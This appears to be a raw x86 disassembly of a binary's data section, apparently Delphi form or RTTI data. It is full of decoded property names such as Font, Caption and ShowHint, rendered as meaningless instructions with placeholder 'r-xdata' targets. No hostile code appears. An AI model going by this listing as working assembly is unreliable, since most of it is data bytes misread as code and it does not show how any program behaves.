add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
js r-xdata
pop edi
add [ eax ] al
push [ eax ]
outsd
insb
nop
hlt
inc esp
add [ eax ] al
dec edi
inc edi
add [ esi + edi ] bh
add [ eax ] al
add al ah
inc esi
add [ eax + 0x2 ] bh
add [ eax ] al
sub bl 0x46
add [ ecx + ebp * 8 ] dl
add cl [ eax ]
or eax 0x64616548
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
outsd
outsb
je r-xdata
je r-xdata
outsd
insb
or [ edi ] al
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
jbe r-xdata
inc ebp
outsd
outsb
je r-xdata
outsd
insb
or [ edi ] al
push ebx
add [ esi + esi + 0x40 ] dh
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
add dh bh
mov [ esi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
fiadd [ ebx ]
insb
add [ eax ] eax
jmp [ ebp + eax * 4 + 0x10044 ]
jb r-xdata
outsd
insb
push cs
push esp
add al cl
inc eax
inc edi
add [ edi + ecx * 4 + 0x58600044 ] bl
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc eax
jb r-xdata
add [ eax ] al
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
inc [ esi + eax * 2 + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
adc [ eax ] al
and [ edx ] al
add bh bh
or [ esi + 0x47 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
push edx
outsd
jb r-xdata
add bh bh
jpe r-xdata
outsd
outsb
jae r-xdata
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
[ esi + eax * 2 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ eax + 0x6f ] cl
je r-xdata
popad
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
jb r-xdata
inc esi
jb r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add [ eax + 0x440b0012 ] al
jb r-xdata
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090026 ] al
outsb
je r-xdata
add [ edx ] bl
add [ 0x6c797453 ] al
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
imul ebp [ esi + 0x74 ] 0x46e8dc73
adc [ eax ] al
cdq
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080022 ] al
push 0x6948776f
outsb
je r-xdata
outsb
jae r-xdata
sbb [ eax ] eax
or [ ebx + 0x65 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
arpl [ ebx + 0x3c ] bp
jmp r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jae r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
jo r-xdata
add [ eax ] al
and eax 0x61500e00
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
call [ eax + 0x100441e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
jmp r-xdata
add [ eax ] cl
add al [ eax ]
[ eax + 0x46 ]
fsub st0
inc esi
inc eax
jb r-xdata
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
or al 0xd0
inc ebx
add al ch
add [ eax ] al
jo r-xdata
outsb
jne r-xdata
add [ eax ] al
sub [ eax ] 0x0
outsb
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
nop
push ds
inc esp
add [ ecx ] al
add [ eax ] dl
add [ eax ] 0x0
int3
add [ eax ] al
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
js r-xdata
push cs
dec edi
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
0x2700046 0xff00
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x78656c62
aam 0x43
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
adc [ eax ] al
push edi
add [ eax ] al
inc [ esp + ebx + 0x3dfc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
js r-xdata
push 0x6948776f
outsb
je r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
clc
dec ecx
dec eax
add [ eax + 0x4a ] bl
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
push ebp
jo r-xdata
inc ebp
outsb
inc esp
jb r-xdata
sub eax [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
add [ eax ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
dec edi
outsb
push eax
outsd
jo r-xdata
je r-xdata
outsb
outsd
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
push eax
adc [ eax ] al
0xd8ff0000 0x441e
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
jpe r-xdata
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001d ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
xor al 0x41
add al bh
add [ eax ] al
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
inc esi
or al 0xd2
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add [ eax ] al
dec eax
int1
inc esi
add [ edx + ecx * 2 ] cl
dec eax
add [ edx + ecx * 2 + 0x48 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
fmul st6
inc ebx
add al bl
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
rol [ ebx ] 0x1
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
dec esi
insb
jae r-xdata
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add al ah
push edx
jb r-xdata
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
arpl [ ebx + 0x68 ] bp
0x2600046 0xff00
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
popad
je r-xdata
inc eax
stc
inc esi
add ah dh
cmp al [ ecx ]
add [ eax ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add al dh
inc edi
add [ eax + 0x6b ] ch
inc ecx
add [ esp + ebp * 2 + 0x47 ] ch
add [ eax + 0x6b ] cl
inc edi
add [ edx ] cl
push esp
push esp
jb r-xdata
add al dl
stc
loopne r-xdata
inc esp
outsd
arpl [ ebx + 0x58 ] bp
rol [ ebx ] 0x1
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
rol [ ebx ] 0x1
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or [ edi + 0x6e ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
outsb
inc ebx
insb
popad
jae r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
inc eax
add [ ecx + edi ] bl
dec esi
outsd
jae r-xdata
add [ esp + edi * 8 + 0x46 ] ch
insb
jae r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
stc
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
stc
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax + 0x800413a ] al
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
sar cl 0x1
inc edi
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax ] bh
arpl [ edi ] ax
pushad
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] ch
pushad
jb r-xdata
inc edi
add [ ebx + ecx * 4 + 0x455c0047 ] al
inc esp
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add ah bl
outsb
inc edi
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x8 ] 0x85
inc edi
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ eax - 0x3fffb888 ] ch
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x86180044
inc edi
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add [ ecx + esi * 2 + 0x47 ] al
add [ esi + edx * 2 + 0x72680044 ] ah
inc edi
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax - 0x67ffb88c ] bl
test [ eax + eax + 0x4 ] al
arpl [ eax + eax + 0x54 ] ax
add [ eax + eax + 0x4 ] 0xb4004484
mov al [ edi ]
push esi
imul esp [ ebp + 0x77 ] 0x6f727245
jb r-xdata
insd
inc ebx
je r-xdata
add [ eax ] cl
inc ebx
outsd
outsd
jae r-xdata
in al dx
stc
inc esi
add [ edi ] al
or dl [ esp + edx * 2 + 0x72 ]
dec esi
add [ ebp - 0x5a3ffc0 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 8 + 0x46 ] bl
add [ eax + eax ] cl
add [ eax ] al
push esp
jns r-xdata
or [ esp + edx * 2 + 0x72 ] edx
dec esi
outsd
stc
inc esi
add [ edi ] al
or [ esp + edx * 2 + 0x72 ] edx
dec esi
outsd
xor al 0xf9
inc esi
add ah dh
cmp al [ ecx ]
add [ eax ] al
or [ ebx + 0x6f ] al
inc esp
jb r-xdata
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh al
sti
inc esi
add [ eax - 0x4 ] bl
inc esi
add [ ebx + eax ] dh
add [ eax ] al
test al 0xdb
inc ebx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + esi * 2 - 0x7063ffb9 ] dl
inc esp
add [ eax + 0x58 ] ah
inc esp
add [ edx + ebp * 2 + 0x7a240041 ] al
mov eax 0x46fa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 8 - 0x393ffba ] dh
inc esi
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
inc ebp
push esp
jb r-xdata
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x7 ] dl
inc esi
add [ eax ] ch
add [ eax ] al
add [ eax + 0x800413a ] al
cmp [ eax ] eax
adc al 0x39
inc eax
mov eax eax
xor al 0xf9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 8 + 0x46 ] al
add [ ecx + edi * 8 + 0x46 ] ah
sub_470470
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_47109c
lds eax [ edi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
add ecx [ ebp + 0x69 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
adc al 0x2
add bh bh
push esp
mov [ edi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
outsb
outsb
cmp al 0x10
inc eax
add [ edx ] dl
add al [ eax ]
dec [ esi + eax * 8 ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
adc [ eax ] eax
add ecx [ ebp + 0x61 ]
js r-xdata
int 0x43
add [ eax + eax ] dh
call [ edx + eax * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
je r-xdata
int3
add [ eax + 0x53080018 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
push [ esi + ebx + 0x1e7c0044 ]
inc esp
push 0x6948776f
outsb
je r-xdata
jo r-xdata
jb r-xdata
outsb
push cs
inc ebp
add [ eax + eax ] bh
[ ebx + 0x10044 ]
and [ esi - 0x795fffbc ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
adc al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] dl
inc eax
add [ edx - 0x27010000 ] bl
push ds
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500e00
jb r-xdata
imul ebp [ esi + 0x74 ] 0x470be873
add [ ecx ] ch
add al [ eax ]
dec [ edi + eax * 8 + 0x10047 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
adc [ eax ] al
mov ebp es
inc edi
add [ eax + 0x10047c6 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50080017 ] al
outsd
jae r-xdata
add [ eax ] dl
inc eax
add [ esi ] bl
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
je r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001e ] al
outsb
inc ebx
push 0x69676e61
outsb
movsb [ di ] [ si ]
or al 0x47
add [ eax ] bh
add al [ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx - 0x4b010000 ] bl
push ds
inc esp
add [ esi + ebx + 0x44 ] bh
add al [ eax ]
adc [ eax ] al
push ds
sub_4712a9
cmp [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ edi + ecx * 2 ] cl
outsb
inc ebx
push 0x69676e61
outsb
inc ebp
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
aam 0x43
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0020 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
push es
dec edi
js r-xdata
inc edi
push ebp
jo r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xfffffe04
into
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
push eax
outsd
jo r-xdata
inc ebp
js r-xdata
ror ah 0x13
inc edi
add [ ecx ] al
push es
push esp
add [ eax - 0x32 ] dl
inc edi
add [ eax + 0x6f ] ah
inc ecx
add [ eax ] cl
int3
add [ eax ] al
dec esp
adc al 0x47
add [ eax + 0x14 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x14 ] bl
inc edi
add [ eax ] dh
add [ eax ] al
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
jo r-xdata
fmul st6
inc ebx
add al bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
outsb
inc ebp
outsb
je r-xdata
or al 0x47
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
dec ebp
outsd
jne r-xdata
jb r-xdata
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x680047c9 ] bl
imul eax [ ecx ] 0xfffffff8
leave
inc edi
add ah bl
int 0x47
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0b00
outsb
xor al 0x41
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
add [ esp + edi ] ah
inc ecx
add [ eax ] cl
cmp [ eax ] eax
js r-xdata
outsb
inc ebx
add al ah
add [ eax ] al
jmp eax
sub_471b00
pop esp
pop edx
inc esp
add [ ecx + ebx * 2 ] dl
inc esp
add al bl
in al dx
inc edi
add [ eax + 0x4004484 ] bl
arpl [ eax + eax + 0x54 ] ax
add [ eax + eax + 0x4 ] 0xfc004484
and [ eax ] ecx
or al 0xf9
inc edi
add [ esp + esi * 8 + 0x47 ] ch
add [ eax ] al
or cl [ eax ]
inc esp
and cl [ eax ]
movsb [ edi ] [ esi ]
and [ eax ] cl
loopne r-xdata
dec eax
add [ eax ] bh
sbb ecx [ eax ]
test al 0x1b
dec eax
add [ edi + ebx + 0x1c200048 ] dl
dec eax
add [ ecx + edi * 8 ] dh
inc edi
add [ ecx + edi * 8 + 0x47 ] bl
add [ eax - 0x2fffb807 ] ch
stc
inc edi
add al bl
sbb [ eax ] ecx
cmp al bh
inc edi
add [ ebx ] bl
add [ 0x2fb010b0 ] cl
mov al 0xe
mov al 0x4e
mov esp 0x4e0201
adc [ edx ] al
sldt [ edi ]
sub edi [ eax + esi - 0x10ff8450 ]
push [ ebx - 0x4e004d01 ]
dec eax
add [ ecx + 0x48 ] dl
add ah bh
rol [ eax + eax + 0x8 ] cl
and cl [ eax ]
int3
sub_471c64
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sbb eax 0x280047
add [ eax ] al
rcl dh 0x1
inc esi
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0x42600041 0x44
sub_471cb0
xor al 0xea
inc ecx
add al cl
or al 0x44
add [ eax ] ch
jecxz r-xdata
or eax 0xe1f00044
inc esp
add [ edx + eax * 2 + 0xe040044 ] cl
inc esp
add [ esi + ecx + 0x44 ] al
add [ eax ] dh
or eax 0xe2040044
inc esp
add [ eax ] cl
loop r-xdata
add [ ebp + ecx + 0x44 ] dh
add [ eax + 0x4c0041e9 ] bh
0xeac00041 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx + 0x44 ] dl
add ah al
or al [ eax + eax - 0x18 ]
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
push ds
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx ] dl
inc edi
add [ eax ] ah
add [ eax ] al
add [ eax + 0x800413a ] al
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x14004036 ] dh
inc ebp
inc ebx
outsd
insd
insd
outsd
outsb
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx + 0xc0047 ] ah
add [ ebx + 0x46 ] ch
add ah bh
loop r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ ecx ] 0x0
or [ ebp + 0x78 ] edx
je r-xdata
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax + 0x6a ] bl
inc ecx
add [ eax + 0x6b ] ch
inc ecx
add [ eax + 0x6b ] dh
inc ecx
add [ eax + 0x23 ] bl
dec eax
add [ edi ] cl
push esp
dec ebp
outsd
outsb
je r-xdata
inc eax
add [ eax + 0x36 ] bl
inc eax
jb r-xdata
add [ eax ] al
push esp
jns r-xdata
sbb eax 0xc0047
add [ eax + 0x4b ] al
dec eax
add [ eax - 0x1b ] ah
inc esi
add [ eax ] cl
dec ebx
dec eax
add [ eax + 0x1300484a ] dl
push esp
dec esp
inc [ eax ]
add eax [ eax ]
push cs
push esp
outsd
insb
outsd
jb r-xdata
clc
sub [ esi ] bl
inc edi
add [ edi ] al
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
outsd
jb r-xdata
jb r-xdata
clc
inc ecx
add [ eax ] bl
add [ eax ] al
jmp [ esp + 0x48 ]
imul esi [ esp + ebp * 2 + 0x65 ] 0x74786554
inc ebx
outsd
insb
outsd
jb r-xdata
inc ecx
add [ eax ] dl
add [ eax ] al
jmp [ esp + 0x48 ]
inc ebx
popad
insb
inc ebx
outsd
insb
outsd
jb r-xdata
imul esi [ ebx + 0x74 ] 0x77656956
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc eax
add [ eax ] cl
push ds
inc edi
add [ eax ] al
add [ eax ] al
outsd
imul ebp [ ecx + ebp * 2 + 0x6e ] 0x78655467
je r-xdata
add [ eax + 0x540e0002 ] al
imul esi [ esp + ebp * 2 + 0x65 ] 0x6b636142
inc ebx
outsd
or [ esi ] bl
inc edi
add ah dh
cmp al [ ecx ]
push es
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
dec ecx
outsb
jb r-xdata
outsb
outsd
insb
outsd
jb r-xdata
outsd
outsb
je r-xdata
clc
inc ecx
add [ eax + eax ] dl
add bh bh
and al 0x48
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add bh bh
insb
outsd
jb r-xdata
insb
jae r-xdata
fild [ ebx ]
adc al 0xe9
outsb
je r-xdata
jb r-xdata
popad
jns r-xdata
or [ esi ] al
popad
jns r-xdata
add [ eax ] eax
add [ eax ] al
add eax [ eax ]
add [ eax ] al
inc eax
add [ edi + ebx + 0x47 ] al
add [ ebx ] al
or eax 0x6c614354
inc esp
popad
jns r-xdata
jae r-xdata
inc edx
popad
arpl [ ebx + 0x43 ] bp
outsd
insb
outsd
jb r-xdata
add [ eax ] al
jmp [ esp + 0x48 ]
add [ eax + edi * 8 + 0x41 ] al
add [ eax ] cl
cmp [ eax ] eax
sbb [ ecx ] bh
